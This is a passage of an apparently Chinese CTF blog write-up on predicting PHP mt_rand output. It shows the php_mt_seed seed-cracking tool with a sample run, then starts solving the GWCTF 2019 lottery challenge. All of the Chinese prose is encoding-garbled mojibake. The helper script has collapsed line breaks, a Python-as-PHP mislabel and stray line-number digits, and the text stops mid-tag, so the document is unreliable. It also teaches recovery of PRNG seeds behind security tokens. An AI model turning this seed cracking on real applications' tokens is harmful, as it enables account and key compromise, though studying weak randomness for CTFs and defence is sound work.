href="#‰∏∫‰ªÄ‰πàÈöèÊú∫Êï∞Ë¶ÅÁî®ÁßçÂ≠êÊí≠ÁßçÔºåÂØπÁßçÂ≠êÁöÑÁêÜËß£" class="headerlink" title="‰∏∫‰ªÄ‰πàÈöèÊú∫Êï∞Ë¶ÅÁî®ÁßçÂ≠êÊí≠ÁßçÔºåÂØπÁßçÂ≠êÁöÑÁêÜËß£"></a>‰∏∫‰ªÄ‰πàÈöèÊú∫Êï∞Ë¶ÅÁî®ÁßçÂ≠êÊí≠ÁßçÔºåÂØπÁßçÂ≠êÁöÑÁêÜËß£</h4><p>È¶ñÂÖàÊàë‰ª¨Ë¶ÅÁü•ÈÅìÔºåËÆ°ÁÆóÊú∫‰∏çËÉΩ‰∫ßÁîüÁªùÂØπÁöÑÈöèÊú∫Êï∞ÔºåÂè™ËÉΩ‰∫ßÁîü‰º™ÈöèÊú∫Êï∞„ÄÇ‰º™Â∞±ÊòØÊúâËßÑÂæãÁöÑÊÑèÊÄù„ÄÇ‰º™ÈöèÊú∫Êï∞Â∞±ÊòØËØ¥ËÆ°ÁÆóÊú∫‰∫ßÁîüÁöÑÈöèÊú∫Êï∞ÊòØÊúâËßÑÂæãÁöÑ„ÄÇÈÇ£‰πàËÆ°ÁÆóÊú∫ÊòØÊÄé‰πà‰∫ßÁîüÈöèÊú∫Êï∞ÁöÑÔºüÂΩìÁÑ∂ÊòØÈÄöËøáÁÆóÊ≥ïÔºåËøô‰∏™ÁÆóÊ≥ïÊòØÊúâÊò†Â∞ÑÂÖ≥Á≥ªÁöÑÔºåÂ¶ÇÊàëÊîæËøõ1Ôºå‰ªñ‰ºöÂá∫Êù•‰∏Ä‰∏™ÁâπÂÆöÁöÑÊï∞</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">RAND_SEED</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">RAND_SEED</span><span class="token operator">*</span><span class="token number">123</span><span class="token operator">+</span><span class="token number">59</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">65536</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ËøôÊòØÊüê‰∏™Á≥ªÁªüÁöÑÈöèÊú∫Êï∞ÁÆóÊ≥ï„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•ÊääËøô‰∏™ÁÆóÊ≥ïÁúãÊàêÊòØ‰∏Ä‰∏™ÈªëÁõíÂ≠êÔºå‰Ω†ÊîæËøõ‰∏Ä‰∏™Êï∞ÔºåÂ∞±‰ºöÂá∫Êù•‰∏Ä‰∏™ÁâπÂÆöÁöÑÊï∞ÔºåÂπ∂ÊääËøô‰∏™Êï∞ÂΩìÂÅö‰∏ã‰∏ÄÊ¨°ÁöÑÁßçÂ≠êÂú®ÊîæËøõÂéª„ÄÇÂú®ËøôÈáåÔºå‰Ω†Á¨¨‰∏ÄÊ¨°ÊîæËøõÂéªÁöÑÊï∞Â∞±ÊòØÈöèÊú∫Êï∞ÁßçÂ≠êÔºå‰πüÂ∞±ÊòØËØ¥ÈöèÊú∫ÁßçÂ≠êÔºàRandom SeedÔºâÂ∞±ÊòØËøô‰∫õÈöèÊú∫Êï∞ÁöÑÂàùÂßãÂÄº„ÄÇ</p><p>Á≥ªÁªüÂÆûÁé∞ÈöèÊú∫Êï∞ÊòØÊääÂΩìÂâçÁöÑÁ≥ªÁªüÊó∂Èó¥ÊîæËøõÂéªÔºåÊØèÊ¨°Êó∂Èó¥ÈÉΩ‰∏ç‰∏ÄÊ†∑ÔºåÊâÄ‰ª•ÂèØ‰ª•ÂÆûÁé∞ÊØèÊ¨°Âá∫Êù•ÁöÑÊï∞ÈÉΩ‰∏ç‰∏ÄÊ†∑„ÄÇÂ¶ÇÊûú‰Ω†ÊØèÊ¨°ÈÉΩÊîæËøõ‰∏ÄÊ†∑ÁöÑÁßçÂ≠êÔºåÁîüÊàêÁöÑÈöèÊú∫Êï∞ÂàóÂ∞±ÊòØ‰∏ÄÊ†∑ÁöÑ‰∫Ü„ÄÇ</p><p>Ê≥®ÈáäÔºöËá™ PHP 4.2.0 Ëµ∑Ôºå‰∏çÂÜçÈúÄË¶ÅÁî® srand() Êàñ mt_srand() ÂáΩÊï∞ÁªôÈöèÊú∫Êï∞ÂèëÁîüÂô®Êí≠Áßç‰∫ÜÔºåÈöèÊú∫Êï∞ÁîüÊàêÂô®ÂèØ‰ª•Ëá™Âä®Êí≠ÁßçÔºåÂõ†Ê≠§Ê≤°ÊúâÂøÖË¶Å‰ΩøÁî®ËØ•ÂáΩÊï∞„ÄÇ</p><h2 id="PHP‰º™ÈöèÊú∫Êï∞ÂÆâÂÖ®"><a href="#PHP‰º™ÈöèÊú∫Êï∞ÂÆâÂÖ®" class="headerlink" title="PHP‰º™ÈöèÊú∫Êï∞ÂÆâÂÖ®"></a>PHP‰º™ÈöèÊú∫Êï∞ÂÆâÂÖ®</h2><h3 id="ÂèØÈ¢ÑÊµãÊÄß"><a href="#ÂèØÈ¢ÑÊµãÊÄß" class="headerlink" title="ÂèØÈ¢ÑÊµãÊÄß"></a>ÂèØÈ¢ÑÊµãÊÄß</h3><p>mt_rand()Âπ∂‰∏çÊòØ‰∏Ä‰∏™ÁúüÈöèÊú∫Êï∞ÁîüÊàêÂáΩÊï∞ÔºåÂÆûÈôÖ‰∏äÁªùÂ§ßÂ§öÊï∞ÁºñÁ®ãËØ≠Ë®Ä‰∏≠ÁöÑÈöèÊú∫Êï∞ÂáΩÊï∞ÁîüÊàêÁöÑÈÉΩÊòØ‰º™ÈöèÊú∫Êï∞„ÄÇ</p><p><strong>‰º™ÈöèÊú∫ÊòØÁî±ÂèØÁ°ÆÂÆöÁöÑÂáΩÊï∞ÔºåÈÄöËøá‰∏Ä‰∏™ÁßçÂ≠êÔºàÂ∏∏Áî®Êó∂ÈíüÔºâÊí≠ÁßçÔºå‰∫ßÁîüÁöÑ‰º™ÈöèÊú∫Êï∞„ÄÇËøôÊÑèÂë≥ÁùÄÔºöÂ¶ÇÊûúÁü•ÈÅì‰∫ÜÁßçÂ≠êÔºåÊàñËÄÖÂ∑≤Áªè‰∫ßÁîüÁöÑÈöèÊú∫Êï∞ÔºåÊàñËÄÖÂ∑≤Áü•‰∫ßÁîüÁöÑÈöèÊú∫Êï∞ÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÈÉΩÂèØËÉΩËé∑ÂæóÊé•‰∏ãÊù•ÈöèÊú∫Êï∞Â∫èÂàóÁöÑ‰ø°ÊÅØÔºåÁü•ÈÅì‰∫Ü‰Ω†ÁöÑÈöèÊú∫Êï∞Â∫èÂàóÔºåÂ∞±ÂèØ‰ª•Á°ÆÂÆö‰Ω†ÁöÑÁßçÂ≠êÂÄº„ÄÇ ÔºàÂèØÈ¢ÑÊµãÊÄßÔºâ„ÄÇ</strong></p><p><strong>ÁÆÄÂçïÂÅáËÆæ‰∏Ä‰∏ã mt_rand()ÂÜÖÈÉ®ÁîüÊàêÈöèÊú∫Êï∞ÁöÑÂáΩÊï∞‰∏∫: rand &#x3D; seed+(i*10) ÂÖ∂‰∏≠ seed ÊòØÈöèÊú∫Êï∞ÁßçÂ≠êÔºå i Ë°®Á§∫Á¨¨Âá†Ê¨°Ë∞ÉÁî®Ëøô‰∏™ÈöèÊú∫Êï∞ÂáΩÊï∞„ÄÇÂΩìÊàë‰ª¨ÂêåÊó∂Áü•ÈÅì i Âíå rand ‰∏§‰∏™ÂÄºÁöÑÊó∂ÂÄôÔºåÂ∞±ËÉΩÂæàÂÆπÊòìÁöÑÁÆóÂá∫seedÁöÑÂÄºÊù•„ÄÇÊØîÂ¶Ç rand&#x3D;21 , i&#x3D;2 ‰ª£ÂÖ•ÂáΩÊï∞ 21&#x3D;seed+(2*10) Â∞±ËÉΩÂæóÂà∞ seed&#x3D;1 „ÄÇÊòØ‰∏çÊòØÂæàÁÆÄÂçïÔºåÂΩìÊàë‰ª¨ÊãøÂà∞seed‰πãÂêéÔºåÂ∞±ËÉΩËÆ°ÁÆóÂá∫ÂΩì i ‰∏∫‰ªªÊÑèÂÄºÊó∂ÂÄôÁöÑ rand ÁöÑÂÄº‰∫Ü„ÄÇ</strong></p><h3 id="PHPÁöÑËá™Âä®Êí≠Áßç"><a href="#PHPÁöÑËá™Âä®Êí≠Áßç" class="headerlink" title="PHPÁöÑËá™Âä®Êí≠Áßç"></a>PHPÁöÑËá™Âä®Êí≠Áßç</h3><p>Êàë‰ª¨Â∑≤ÁªèÁü•ÈÅìÊØè‰∏ÄÊ¨°mt_rand()Ë¢´Ë∞ÉÁî®ÈÉΩ‰ºöÊ†πÊçÆseedÂíåÂΩìÂâçË∞ÉÁî®ÁöÑÊ¨°Êï∞iÊù•ËÆ°ÁÆóÂá∫‰∏Ä‰∏™‰º™ÈöèÊú∫Êï∞„ÄÇËÄå‰∏îseedÊòØËá™Âä®Êí≠ÁßçÁöÑÔºö</p><blockquote><p>Note: Ëá™ PHP 4.2.0 Ëµ∑Ôºå‰∏çÂÜçÈúÄË¶ÅÁî® srand() Êàñ mt_srand() ÁªôÈöèÊú∫Êï∞ÂèëÁîüÂô®Êí≠ÁßçÔºåÂõ†‰∏∫Áé∞Âú®ÊòØÁî±Á≥ªÁªüËá™Âä®ÂÆåÊàêÁöÑ„ÄÇ</p></blockquote><p>ÈÇ£‰πàÈóÆÈ¢òÂ∞±Êù•‰∫ÜÔºåÂà∞Â∫ïÁ≥ªÁªüËá™Âä®ÂÆåÊàêÊí≠ÁßçÊòØÂú®‰ªÄ‰πàÊó∂ÂÄôÔºåÂ¶ÇÊûúÊØèÊ¨°Ë∞ÉÁî®mt_rand()ÈÉΩ‰ºöËá™Âä®Êí≠ÁßçÈÇ£‰πàÁ†¥Ëß£seed‰πüÂ∞±Ê≤°ÊÑè‰πâ‰∫Ü„ÄÇ</p><p>‰∏çÂπ∏ÁöÑÊòØÔºåphpÊØèÊ¨°Ë∞ÉÁî®mt_rand()ÂáΩÊï∞Êó∂ÔºåÈÉΩ‰ºöÂÖàÊ£ÄÊü•ÊòØÂê¶Â∑≤ÁªèÊí≠Áßç„ÄÇÂ¶ÇÊûúÂ∑≤ÁªèÊí≠ÁßçÂ∞±Áõ¥Êé•‰∫ßÁîüÈöèÊú∫Êï∞ÔºåÂê¶ÂàôË∞ÉÁî®php_mt_srandÊù•Êí≠Áßç„ÄÇ‰πüÂ∞±ÊòØËØ¥ÊØè‰∏™php cgiËøõÁ®ãÊúüÈó¥ÔºåÂè™ÊúâÁ¨¨‰∏ÄÊ¨°Ë∞ÉÁî®mt_rand()‰ºöËá™Âä®Êí≠Áßç„ÄÇÊé•‰∏ãÊù•ÈÉΩ‰ºöÊ†πÊçÆËøô‰∏™Á¨¨‰∏ÄÊ¨°Êí≠ÁßçÁöÑÁßçÂ≠êÊù•ÁîüÊàêÈöèÊú∫Êï∞„ÄÇ</p><p><strong>php_mt_seed</strong></p><p>Êàë‰ª¨Â∑≤ÁªèÁü•ÈÅìÈöèÊú∫Êï∞ÁöÑÁîüÊàêÊòØ‰æùËµñÁâπÂÆöÁöÑÂáΩÊï∞Ôºå‰∏äÈù¢ÊõæÁªèÂÅáËÆæ‰∏∫ rand &#x3D; seed+(i<em>10) „ÄÇÂØπ‰∫éËøôÊ†∑‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂáΩÊï∞ÔºåÊàë‰ª¨ÂΩìÁÑ∂ÂèØ‰ª•Áõ¥Êé•ËÆ°ÁÆóÂá∫‰∏ÄÁªÑËß£Êù•Ôºå‰ΩÜ mt_rand() ÂÆûÈôÖ‰ΩøÁî®ÁöÑÂáΩÊï∞ÂèØÊòØÁõ∏ÂΩìÂ§çÊùÇ‰∏îÊó†Ê≥ïÈÄÜËøêÁÆóÁöÑ„ÄÇ*<em>ÊúâÊïàÁöÑÁ†¥Ëß£ÊñπÊ≥ïÂÖ∂ÂÆûÊòØÁ©∑‰∏æÊâÄÊúâÁöÑÁßçÂ≠êÂπ∂Ê†πÊçÆÊûö‰∏æÂá∫ÁöÑÁßçÂ≠êÁîüÊàêÈöèÊú∫Êï∞Â∫èÂàóÂÜçË∑üÂ∑≤Áü•ÁöÑÈöèÊú∫Êï∞Â∫èÂàóÂÅöÊØîÂØπÊù•È™åËØÅÁßçÂ≠êÊòØÂê¶Ê≠£Á°Æ„ÄÇphp_mt_seedÂ∞±ÊòØËøô‰πà‰∏Ä‰∏™Â∑•ÂÖ∑ÔºåÂÆÉÁöÑÈÄüÂ∫¶ÈùûÂ∏∏Âø´ÔºåË∑ëÂÆå2^32‰Ωçseed‰πüÂ∞±Âá†ÂàÜÈíü„ÄÇ</em></em> ÂÆÉÂèØ‰ª•Ê†πÊçÆÂçïÊ¨°mt_rand()ÁöÑËæìÂá∫ÁªìÊûúÁõ¥Êé•ÁàÜÁ†¥Âá∫ÂèØËÉΩÁöÑÁßçÂ≠êÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ÁàÜÁ†¥Á±ª‰ººmt_rand(1,100)ËøôÊ†∑ÈôêÂÆö‰∫ÜMIN MAXËæìÂá∫ÁöÑÁßçÂ≠ê„ÄÇ</p><p>ÂæàÂ§öÂõΩÂÜÖÂºÄÂèëËÄÖÂú®Á®ãÂ∫è‰∏≠‰ΩøÁî®‰∫Ümt_rand()Êù•ÁîüÊàêÂÆâÂÖ®‰ª§Áâå„ÄÅÊ†∏ÂøÉÂä†Ëß£ÂØÜkeyÁ≠âÁ≠âÂØºËá¥‰∏•ÈáçÁöÑÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇ</p><p>Áî®Âà∞ÁöÑÊòØÁàÜÁ†¥ÔºåÂ∑≤ÁªèÊúâÂÜôÂ•ΩÁöÑCËÑöÊú¨‰∫Ü„ÄÇ</p><p>ËøôÈáåÁÆÄÂçïÁöÑ‰ªãÁªç‰∏ãËøô‰∏™ËÑöÊú¨ÂíãÁî®</p><h3 id="ÁßçÂ≠êÁàÜÁ†¥Â∑•ÂÖ∑‚Äî‚Äîphp-mt-seed"><a href="#ÁßçÂ≠êÁàÜÁ†¥Â∑•ÂÖ∑‚Äî‚Äîphp-mt-seed" class="headerlink" title="ÁßçÂ≠êÁàÜÁ†¥Â∑•ÂÖ∑‚Äî‚Äîphp_mt_seed"></a>ÁßçÂ≠êÁàÜÁ†¥Â∑•ÂÖ∑‚Äî‚Äîphp_mt_seed</h3><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="http://www.openwall.com/php_mt_seed">http://www.openwall.com/php_mt_seed</a></p><p>ÂÆÉÂèØ‰ª•Ê†πÊçÆÂçïÊ¨°mt_rand()ÁöÑËæìÂá∫ÁªìÊûúÁõ¥Êé•ÁàÜÁ†¥Âá∫ÂèØËÉΩÁöÑÁßçÂ≠êÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ÁàÜÁ†¥Á±ª‰ººmt_rand(1,100)ËøôÊ†∑ÈôêÂÆö‰∫ÜMIN MAXËæìÂá∫ÁöÑÁßçÂ≠ê„ÄÇ</p><p>‰∏ãËΩΩÂêéÔºåÊâßË°åÂ¶Ç‰∏ãÂëΩ‰ª§ÁºñËØëÁîüÊàêÔºö</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kali‰∏ãÔºåËøõÂÖ•ÁõÆÂΩïÔºåmake  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ÂÖ∑‰Ωì‰ΩøÁî®"><a href="#ÂÖ∑‰Ωì‰ΩøÁî®" class="headerlink" title="ÂÖ∑‰Ωì‰ΩøÁî®"></a>ÂÖ∑‰Ωì‰ΩøÁî®</h4><p>php_mt_seedÁöÑÁî®Ê≥ïÂèØËÉΩÂæàÁÆÄÂçïÔºå‰πüÂèØËÉΩÂæàÂ§çÊùÇÔºåÂÖ∑‰ΩìÂèñÂÜ≥‰∫éÁî®‰æãÁöÑËØ¶ÁªÜ‰ø°ÊÅØ„ÄÇËøôÊòØ‰∏Ä‰∏™ÊúÄÁÆÄÂçïÁöÑÁî®Ê≥ïÁ§∫‰æãÔºö<br> È¶ñÂÖà‰ΩøÁî®PHPÁîüÊàê‰∏Ä‰∏™‚ÄúÈöèÊú∫‚ÄùÊï∞Â≠óÔºå‰æãÂ¶ÇÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$ php5 <span class="token operator">-</span>r <span class="token string single-quoted-string">'mt_srand(1234567890); echo mt_rand(),"\n";'</span><span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéËøêË°åcrackerÔºàÂú®Ê≠§Á§∫‰æã‰∏≠ÔºåÂú®‰∏é‰∏äÈù¢Áî®‰∫éÊûÑÂª∫ÁöÑÁ≥ªÁªüÁõ∏ÂêåÁöÑÁ≥ªÁªü‰∏äÔºâÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$ time <span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">1328851649</span>   Pattern<span class="token punctuation">:</span> <span class="token constant">EXACT</span>   Version<span class="token punctuation">:</span> <span class="token number">3.0</span><span class="token number">.7</span> to <span class="token number">5.2</span><span class="token number">.0</span>   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0xfc000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">16261.0</span> Mseeds<span class="token operator">/</span>s   Version<span class="token punctuation">:</span> <span class="token number">5.2</span><span class="token number">.1</span><span class="token operator">+</span>   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0x1e000000</span> <span class="token operator">-</span> <span class="token number">0x1fffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.8</span> Mseeds<span class="token operator">/</span>s   seed <span class="token operator">=</span> <span class="token number">0x1fd65f9a</span> <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>   Found <span class="token number">1</span><span class="token punctuation">,</span> trying <span class="token number">0x26000000</span> <span class="token operator">-</span> <span class="token number">0x27ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s   seed <span class="token operator">=</span> <span class="token number">0x273a3517</span> <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>   Found <span class="token number">2</span><span class="token punctuation">,</span> trying <span class="token number">0x48000000</span> <span class="token operator">-</span> <span class="token number">0x49ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>   Found <span class="token number">4</span><span class="token punctuation">,</span> trying <span class="token number">0xfe000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s   Found <span class="token number">4</span>     real    <span class="token number">0</span>m47<span class="token operator">.</span><span class="token number">028</span>s   user    <span class="token number">6</span>m15<span class="token operator">.</span><span class="token number">211</span>s   sys     <span class="token number">0</span>m0<span class="token operator">.</span><span class="token number">015</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php_mt_seedÈ¶ñÂÖàÊêúÁ¥¢ÊóßÁâàPHP 3.0.7Ëá≥5.2.0ÁöÑÁßçÂ≠êÔºåÈÄöÂ∏∏Âè™ÈúÄ‰∏ÄÁßíÈíüÂç≥ÂèØÂÆåÊàê„ÄÇÁÑ∂ÂêéÔºåÂÆÉ‰ºöÂêåÊó∂ÊêúÁ¥¢PHP 5.2.1Ëá≥7.0.xÂíåPHP 7.1.0+ÁöÑÁßçÂ≠êÔºåËøôÈúÄË¶Å‰∏ÄÊÆµÊó∂Èó¥„ÄÇ</p><p>‰∏ãÈù¢ÊºîÁ§∫‰∏Ä‰∏™Â§çÊùÇÁöÑÁî®Ê≥ïÁ§∫‰æãÔºö<br> php_mt_seed Âú®ÂÖ∂ÂëΩ‰ª§Ë°å‰∏äÂèØ‰ª•Êúâ1„ÄÅ2„ÄÅ4ÊàñÊõ¥Â§öÁöÑÊï∞Â≠ó„ÄÇÊï∞Â≠óÊåáÂÆö‰∫ÜÂØπ mt_rand()ÂáΩÊï∞ËæìÂá∫ÁöÑÁ∫¶ÊùüÔºåÂ¶Çmt_rand(0,50)„ÄÇ</p><p>ÂΩì‰ªÖ‰ΩøÁî®‰∏Ä‰∏™Êï∞Â≠óË∞ÉÁî®Êó∂ÔºåËøôÊòØmt_randÂáΩÊï∞ÁöÑÁ¨¨‰∏Ä‰∏™Áî®Êù•ÁàÜÁ†¥ÁßçÂ≠êÁöÑËæìÂá∫„ÄÇ<br> ÂΩìÁî®2‰∏™Êï∞Â≠óË∞ÉÁî®Êó∂ÔºåÂÆÉ‰ª¨ÊòØÁ¨¨‰∏Ä‰∏™mt_rand()ÁöÑËæìÂá∫Â∫îËêΩÂÖ•ÁöÑËåÉÂõ¥ÔºàÊúÄÂ∞èÂíåÊúÄÂ§ßÔºåÊåâËØ•È°∫Â∫èÔºâ„ÄÇ<br> <strong>ÂΩìÁî®4‰∏™Êï∞Â≠óË∞ÉÁî®Êó∂ÔºåÂâç2‰∏™ÁªôÂá∫Á¨¨‰∏Ä‰∏™mt_rand()ËæìÂá∫ÁöÑÁïåÈôêÔºåÂêé‰∏§‰∏™2ÁªôÂá∫‰º†ÈÄíÂà∞mt_rand()ÁöÑËåÉÂõ¥„ÄÇ</strong></p><h1 id="ÂÆû‰æã‚Äî‚Äî-GWCTF-2019-ÊûØÁá•ÁöÑÊäΩÂ•ñ"><a href="#ÂÆû‰æã‚Äî‚Äî-GWCTF-2019-ÊûØÁá•ÁöÑÊäΩÂ•ñ" class="headerlink" title="ÂÆû‰æã‚Äî‚Äî[GWCTF 2019]ÊûØÁá•ÁöÑÊäΩÂ•ñ"></a>ÂÆû‰æã‚Äî‚Äî[GWCTF 2019]ÊûØÁá•ÁöÑÊäΩÂ•ñ</h1><p>ËøõÂÖ•È¢òÁõÆ<br> <img src="https://img-blog.csdnimg.cn/20200712185058965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"><br> ÊòØ‰∏™ÁåúÂ≠óÁ¨¶ÁöÑÊ∏∏ÊàèÔºåÂπ∂‰∏îÂëäËØâ‰Ω†‰∫Ü‰∏ÄÈÉ®ÂàÜÂÄºÔºö<code>utP4yKDDVV</code>Ôºå‰º∞ËÆ°ÊòØÂ∑≤Áü•‰∫ßÁîüÁöÑÈöèÊú∫Êï∞ÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇ<br> F12 Êü•ÁúãÊ∫êÁ†ÅÔºåÂèëÁé∞check.phpÔºö<br> <img src="https://img-blog.csdnimg.cn/20200712185243498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"><br> ËøõÂÖ•check.phpÔºåÁªôÂá∫‰∫Ü‰Ω†Ê∫êÁ†ÅÔºö<br> <img src="https://img-blog.csdnimg.cn/20200712185326552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"><br> ÂèØÁü•Ê∫êÁ†ÅÁöÑÈÄªËæëÊòØÔºåÂÖà‰∫ßÁîü‰∏Ä‰∏™0Âà∞999999999‰πãÈó¥ÁöÑÈöèÊú∫Êï¥Êï∞‰Ωú‰∏∫ÈöèÊú∫Êï∞ÁßçÂ≠êË¢´mt_srand()ÂáΩÊï∞Êí≠Áßç„ÄÇÁÑ∂ÂêéÂú®<code>$str_long1</code>Ëøô‰∏ÄÈïø‰∏≤Â≠óÁ¨¶‰∏≤‰∏≠Áî®mt_rand()Êù•ÈöèÊú∫ÂèñÂá∫20‰∏™Â≠óÁ¨¶ÊûÑÊàêÂ≠óÁ¨¶‰∏≤<code>$str</code>Âπ∂ËæìÂá∫<code>$str</code>ÁöÑÂâçÂçÅ‰ΩçÁªô‰Ω†„ÄÇÊúÄÂêéÔºåÂ∞Ü‰Ω†ÁåúÁöÑËæìÂÖ•ÁöÑÂÄºÊãº‰∏äÁªô‰Ω†ÁöÑÂÄº‰∏é<code>$str</code>ËøõË°åÂº∫Á±ªÂûãÊØîËæÉÔºåÂØπÊØîÊàêÂäüÂàôËøîÂõûflag„ÄÇÂèØËßÅÔºåÂ¶ÇÊûúÊúÄÂêéËÉΩPOSTÊ≠£Á°ÆÁöÑ20‰ΩçÔºåËé∑Âæóflag„ÄÇÈÇ£‰πàÂÖ≥ÈîÆÂ∞±ÊòØÔºåË¶ÅÊ†πÊçÆÁªô‰Ω†ÁöÑ10‰ΩçÂØÜÁ†ÅÔºåÂèçÊé®Âá∫mt_srandÁöÑÁßçÂ≠êÊòØ‰ªÄ‰πàÔºå‰ªéËÄå‰æùËë´Ëä¶ÁîªÁì¢ÊûÑÈÄ†ÁßÅÈí•„ÄÇ<br> Êé•‰∏ãÊù•Êàë‰ª¨Áî®php_mt_seedÂ∑•ÂÖ∑ÂØπÈöèÊú∫Êï∞ÁßçÂ≠êËøõË°åÁàÜÁ†¥„ÄÇ</p><p>ÂÖàÁî®ËÑöÊú¨Â∞Ü‰º™ÈöèÊú∫Êï∞ËΩ¨Êç¢Êàêphp_mt_seedÂèØ‰ª•ËØÜÂà´ÁöÑÊï∞ÊçÆÊ†ºÂºèÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">str1<span class="token operator">=</span><span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string single-quoted-string">'utP4yKDDVV'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token operator">::</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># ÂÄíÂ∫è</span>length <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>res<span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token string single-quoted-string">'0'</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> res<span class="token comment">// Ââç‰∏§‰∏™str(j)‰ª£Ë°®Á¨¨‰∏Ä‰∏™mt_rand()ËæìÂá∫ÁöÑÁïåÈôêÔºåÂêé‰∏§‰∏™ÂèÇÊï∞0Âíåstr(len(str1)-1)Ë°®Á§∫‰º†ÈÄíÂà∞ mt_rand()ÁöÑËåÉÂõ¥‰∏∫0Âà∞61</span><span class="token number">12345678910111213</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 